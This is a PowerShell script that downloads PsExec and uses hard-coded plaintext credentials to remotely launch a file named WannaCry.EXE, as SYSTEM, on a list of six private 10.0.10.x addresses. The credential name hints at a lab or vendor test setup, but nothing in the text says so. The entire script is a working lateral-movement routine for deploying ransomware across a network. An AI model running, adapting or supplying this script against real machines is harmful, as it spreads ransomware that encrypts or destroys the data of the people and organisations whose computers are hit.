# List of target IPs
$ips = @("10.0.10.1", "10.0.10.102", "10.0.10.151", "10.0.10.150", "10.0.10.200", "10.0.10.100")

# Path of the remote executable
$remoteExePath = "C:\Windows\Temp\WannaCry.EXE"  # Ensure this file exists on each target machine

# Credentials for remote execution
$username = "trendmicro"
$password = "trendmicro123"

# URL to download PsExec
$psexecUrl = "https://download.sysinternals.com/files/PSTools.zip"
$psexecZipPath = "C:\PSTools.zip"
$psexecFolder = "C:\PSTools"
$psexecPath = "$psexecFolder\PsExec.exe"

# Download and extract PsExec
if (-Not (Test-Path $psexecPath)) {
    Write-Host "Downloading PsExec..."
    Invoke-WebRequest -Uri $psexecUrl -OutFile $psexecZipPath

    Write-Host "Extracting PsExec..."
    Expand-Archive -Path $psexecZipPath -DestinationPath $psexecFolder
}

# Function to execute remotely using PsExec
function Execute-RemoteCommand {
    param (
        [string]$target,
        [string]$exePath,
        [string]$username,
        [string]$password
    )

    Write-Host "Attempting to execute $exePath on $target using PsExec..."

    $command = "& `"$psexecPath`" \\$target -u $username -p $password -accepteula -s -d `"$exePath`""

    try {
        Invoke-Expression $command
        Write-Host "[+] Successfully executed $exePath on $target"
    }
    catch {
        Write-Host "[-] Failed to execute $exePath on $target"
    }
}

# Loop through all target machines and execute the file
foreach ($ip in $ips) {
    Execute-RemoteCommand -target $ip -exePath $remoteExePath -username $username -password $password
}

Write-Host "`nTask Completed."
